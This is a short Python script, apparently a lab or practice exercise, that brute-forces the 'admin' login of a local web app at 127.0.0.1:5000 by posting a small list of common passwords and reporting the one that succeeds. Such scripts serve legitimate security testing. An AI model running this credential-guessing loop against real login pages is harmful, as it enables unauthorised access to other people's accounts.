import requests
url = "http://127.0.0.1:5000/"
username = "admin"
wordlist =["admin","adminpassword","admin12345","12345678","guest"]
for password in wordlist:
    data = { "username": username,
             "password": password}
    r = requests.post(url, data=data)   
    if "Login success" in r.text:
        print(f"[+] Password found:, {password}")
        break 
    else:
        print("[-] Tried:", password)
                

             
